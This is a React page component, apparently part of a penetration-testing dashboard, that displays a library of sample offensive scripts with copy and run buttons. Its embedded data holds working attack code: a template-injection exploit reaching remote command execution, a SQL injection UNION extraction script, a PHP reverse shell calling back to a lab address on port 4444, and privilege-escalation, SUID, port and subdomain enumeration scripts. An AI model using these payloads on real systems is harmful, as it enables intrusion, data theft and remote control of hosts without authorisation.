import { useState } from 'react'
import { FileText, Play, Search, FolderOpen, Plus, Trash2 } from 'lucide-react'
import Card from '../components/ui/Card.jsx'
import Badge from '../components/ui/Badge.jsx'
import Button from '../components/ui/Button.jsx'
import CopyButton from '../components/ui/CopyButton.jsx'

const langColors = {
  Python: 'lavender',
  Bash: 'mint',
  JavaScript: 'gold',
  PHP: 'rose',
  Ruby: 'rose',
  PowerShell: 'sky',
  Go: 'sky',
  Rust: 'gold',
}

const sampleScripts = [
  {
    id: 1,
    name: 'exploit_rce.py',
    lang: 'Python',
    size: '2.4 KB',
    modified: '2 hours ago',
    code: `#!/usr/bin/env python3
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://target:8080"
PAYLOAD = "{{7*7}}"

def check_ssti(url):
    """Test for Server-Side Template Injection"""
    r = requests.get(f"{url}/search?q={PAYLOAD}")
    if "49" in r.text:
        print(f"[+] SSTI confirmed on {url}")
        return True
    return False

def exploit(url):
    rce_payload = (
        "{{config.__class__.__init__.__globals__"
        "['os'].popen('id').read()}}"
    )
    r = requests.get(f"{url}/search?q={rce_payload}")
    print(f"[+] Output: {r.text}")

if __name__ == "__main__":
    if check_ssti(TARGET):
        exploit(TARGET)`,
  },
  {
    id: 2,
    name: 'enum_suid.sh',
    lang: 'Bash',
    size: '1.1 KB',
    modified: '5 hours ago',
    code: `#!/bin/bash
# SUID Binary Enumeration Script

echo "[*] Finding SUID binaries..."
find / -perm -4000 -type f 2>/dev/null | while read binary; do
    owner=$(stat -c '%U' "$binary")
    perms=$(stat -c '%a' "$binary")
    echo "[+] $binary (owner: $owner, perms: $perms)"

    # Check GTFOBins
    basename=$(basename "$binary")
    if grep -qi "$basename" /tmp/gtfobins.txt 2>/dev/null; then
        echo "    [!] Known GTFOBins entry!"
    fi
done

echo ""
echo "[*] Finding SGID binaries..."
find / -perm -2000 -type f 2>/dev/null`,
  },
  {
    id: 3,
    name: 'sqli_union.py',
    lang: 'Python',
    size: '3.8 KB',
    modified: '1 day ago',
    code: `#!/usr/bin/env python3
import requests
import string

URL = "http://target/login"

def find_columns():
    """Determine number of columns via ORDER BY"""
    for i in range(1, 20):
        payload = f"' ORDER BY {i}-- -"
        r = requests.post(URL, data={"user": payload, "pass": "x"})
        if "error" in r.text.lower():
            return i - 1
    return 0

def extract_tables(cols):
    """Extract table names from information_schema"""
    nulls = ",".join(["NULL"] * cols)
    payload = f"' UNION SELECT {nulls}-- -"
    payload = payload.replace("NULL", 
        "GROUP_CONCAT(table_name)", 1)
    r = requests.post(URL, data={"user": payload, "pass": "x"})
    return r.text

print(f"[+] Columns: {find_columns()}")`,
  },
  {
    id: 4,
    name: 'port_scan.js',
    lang: 'JavaScript',
    size: '1.9 KB',
    modified: '2 days ago',
    code: `const net = require('net');

const TARGET = process.argv[2] || '127.0.0.1';
const START = parseInt(process.argv[3]) || 1;
const END = parseInt(process.argv[4]) || 1024;
const TIMEOUT = 500;

async function scanPort(host, port) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(TIMEOUT);
    socket.on('connect', () => {
      socket.destroy();
      resolve({ port, state: 'open' });
    });
    socket.on('timeout', () => {
      socket.destroy();
      resolve(null);
    });
    socket.on('error', () => resolve(null));
    socket.connect(port, host);
  });
}

(async () => {
  console.log(\`Scanning \${TARGET} [\${START}-\${END}]\`);
  const results = [];
  for (let p = START; p <= END; p++) {
    const r = await scanPort(TARGET, p);
    if (r) results.push(r);
  }
  results.forEach(r => console.log(\`  \${r.port}/tcp open\`));
})();`,
  },
  {
    id: 5,
    name: 'rev_shell.php',
    lang: 'PHP',
    size: '0.8 KB',
    modified: '3 days ago',
    code: `<?php
$ip = '10.10.14.5';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', [
    0 => $sock,
    1 => $sock,
    2 => $sock
], $pipes);
?>`,
  },
  {
    id: 6,
    name: 'privesc_check.sh',
    lang: 'Bash',
    size: '4.2 KB',
    modified: '4 days ago',
    code: `#!/bin/bash
# Linux Privilege Escalation Checker

echo "=== System Info ==="
uname -a
cat /etc/os-release 2>/dev/null | head -3

echo ""
echo "=== Current User ==="
id
sudo -l 2>/dev/null

echo ""
echo "=== Writable Directories ==="
find / -writable -type d 2>/dev/null | head -20

echo ""
echo "=== Cron Jobs ==="
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ 2>/dev/null`,
  },
  {
    id: 7,
    name: 'dns_enum.go',
    lang: 'Go',
    size: '2.1 KB',
    modified: '1 week ago',
    code: `package main

import (
    "fmt"
    "net"
    "os"
    "bufio"
)

func main() {
    domain := os.Args[1]
    file, _ := os.Open("subdomains.txt")
    defer file.Close()
    
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        sub := scanner.Text()
        target := fmt.Sprintf("%s.%s", sub, domain)
        ips, err := net.LookupHost(target)
        if err == nil {
            fmt.Printf("[+] %s -> %v\\n", target, ips)
        }
    }
}`,
  },
]

export default function Scripts() {
  const [selected, setSelected] = useState(sampleScripts[0])
  const [search, setSearch] = useState('')

  const filtered = sampleScripts.filter((s) =>
    s.name.toLowerCase().includes(search.toLowerCase())
  )

  return (
    <div className="flex gap-4 h-[calc(100vh-120px)]">
      {/* File List Panel */}
      <div className="w-[350px] flex-shrink-0 flex flex-col gap-3">
        <div className="relative">
          <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-text-dim" />
          <input
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Search scripts..."
            className="w-full bg-slime-card border border-white/[0.06] rounded-lg pl-8 pr-3 py-2.5
              font-mono text-[12px] text-text-primary placeholder:text-text-faint
              focus:bg-slime-code focus:border-mint/15 focus:outline-none transition-colors"
          />
        </div>

        <div className="flex items-center justify-between">
          <span className="font-mono text-[10px] text-text-dim">{filtered.length} scripts</span>
          <Button variant="ghost" size="small">
            <Plus size={12} /> New
          </Button>
        </div>

        <div className="flex-1 overflow-auto space-y-1">
          {filtered.map((script) => (
            <Card
              key={script.id}
              active={selected.id === script.id}
              onClick={() => setSelected(script)}
            >
              <div className="flex items-center gap-2.5">
                <FileText size={16} className="text-text-dim flex-shrink-0" />
                <div className="flex-1 min-w-0">
                  <div className="font-mono text-[12px] text-text-primary truncate">{script.name}</div>
                  <div className="flex items-center gap-2 mt-0.5">
                    <Badge color={langColors[script.lang]}>{script.lang}</Badge>
                    <span className="font-mono text-[9px] text-text-faint">{script.size}</span>
                    <span className="font-mono text-[9px] text-text-faint">{script.modified}</span>
                  </div>
                </div>
              </div>
            </Card>
          ))}
        </div>
      </div>

      {/* Code Preview Panel */}
      <Card className="flex-1 flex flex-col min-w-0">
        <div className="flex items-center justify-between mb-3">
          <div className="flex items-center gap-2">
            <FolderOpen size={16} className="text-mint" />
            <span className="font-heading font-semibold text-[14px] text-text-primary">{selected.name}</span>
            <Badge color={langColors[selected.lang]}>{selected.lang}</Badge>
          </div>
          <div className="flex items-center gap-2">
            <CopyButton text={selected.code} source={selected.name} />
            <Button variant="ghost" size="small">
              <Play size={12} /> Run
            </Button>
            <Button variant="destructive" size="small">
              <Trash2 size={12} />
            </Button>
          </div>
        </div>
        <div className="flex-1 bg-slime-code rounded-md border border-white/[0.04] overflow-auto">
          <pre className="p-4">
            <code className="font-mono text-[11px] text-mint leading-relaxed whitespace-pre">
              {selected.code}
            </code>
          </pre>
        </div>
      </Card>
    </div>
  )
}
